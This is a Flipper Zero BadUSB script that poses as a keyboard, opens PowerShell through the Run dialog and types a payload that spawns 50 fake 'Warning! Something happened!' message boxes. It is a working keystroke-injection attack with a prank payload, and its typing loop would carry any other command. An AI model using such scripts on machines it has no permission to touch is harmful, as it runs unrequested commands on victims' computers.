// Script
let script = [
    "function MsgBox {[CmdletBinding()]param ([Parameter(Mandatory = $True)][Alias(\"m\")][string]$message,[Parameter(Mandatory = $False)][Alias(\"t\")][string]$title,",
    "[Parameter(Mandatory = $False)][Alias(\"b\")][ValidateSet(\'OK\',\'OKCancel\',\'YesNoCancel\',\'YesNo\')][string]$button,",
    "[Parameter(Mandatory = $False)][Alias(\"i\")][ValidateSet(\'None\',\'Hand\',\'Question\',\'Warning\',\'Asterisk\')][string]$image)",
    "Add-Type -AssemblyName PresentationCore, PresentationFramework if (!$title) { $title = \" \" } if (!$button) { $button = \"OK\" } if (!$image) { $image = \"None\" }",
    "[System.Windows.MessageBox]::Show($message, $title, $button, $image)}",
    "for ($i = 1; $i -le 50; $i++) {",
        "Start-Job -ScriptBlock {",
            "Add-Type -AssemblyName PresentationCore, PresentationFramework",
            "[System.Windows.MessageBox]::Show(\"Warning! Something happened!\", \"Warning\", \"OK\", \"Warning\")",
        "}",
        "Start-Sleep -Milliseconds 10",
    "}",
    "Get-Job | Wait-Job | Out-Null",
    "Get-Job | Remove-Job",
    "exit",
];

// Requirements
let badusb = require("badusb");

// VID&PID as HID
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfrName: "Flipper", prodName: "Zero", layoutPath: "/ext/badusb/assets/layouts/en-US.kl" });
print("Waiting for connection");

// Keep Connected
while (!badusb.isConnected()) {
    delay(1000);
}

// Open powershell
print("Opening powershell");
badusb.press("GUI", "r");
delay(600);
badusb.println("powershell");
delay(600);

// Run payload
print("Running payload");
for (let i = 0; i < script.length; i++) {
    badusb.println(script[i]);
    delay(100);
}

// Stop script
badusb.quit();
print("Done");